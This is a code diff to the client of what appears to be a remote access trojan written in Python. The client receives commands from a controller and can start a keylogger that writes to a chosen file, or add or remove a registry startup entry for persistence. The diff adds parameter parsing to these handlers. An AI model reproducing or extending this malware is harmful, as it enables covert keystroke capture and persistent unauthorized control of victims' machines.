@@ -77,11 +77,17 @@ class client:
         print("Handshake complete...")
 
     def exe_tool(self, message):
-        command = message[PK_PAYLOAD_FLAG].lower()
+        parameters = message[PK_PAYLOAD_FLAG].lower().split(' ')
         return_message = {PK_COMMAND_FLAG:'', PK_PAYLOAD_FLAG:''}
 
+        command = parameters.pop(0)
+
         if command == "keylogger":
-            keylogger.keylogger("data.txt")
+
+            if len(parameters) > 0:
+                keylogger.keylogger(' '.join(parameters))
+            else:
+                keylogger.keylogger("data.txt")
 
             return_message[PK_COMMAND_FLAG] = COMMAND_RESPONSE
             return_message[PK_PAYLOAD_FLAG] = "Keylogger Activated."
@@ -90,7 +96,16 @@ class client:
             return
 
         elif command == "placestartup":
-            if regedit.placeStartup():
+            b_ret = False
+
+            if len(parameters) >= 2:
+                b_ret = regedit.placeStartup(name=parameters[0], root_path=parameters[1])
+            elif len(parameters) == 1:
+                b_ret = regedit.placeStartup(name=parameters[0])
+            else:
+                b_ret = regedit.placeStartup()
+
+            if b_ret == True:
                 reply = "Successful!"
             else:
                 reply = "Failed!"
@@ -101,7 +116,14 @@ class client:
             return
 
         elif command == "removestartup":
-            if regedit.removeStartup():
+            b_ret = False
+
+            if len(parameters) > 0:
+                b_ret = regedit.removeStartup(name=parameters[0])
+            else:
+                b_ret = regedit.removeStartup()
+
+            if b_ret == True:
                 reply = "Successful!"
             else:
                 reply = "Failed!"
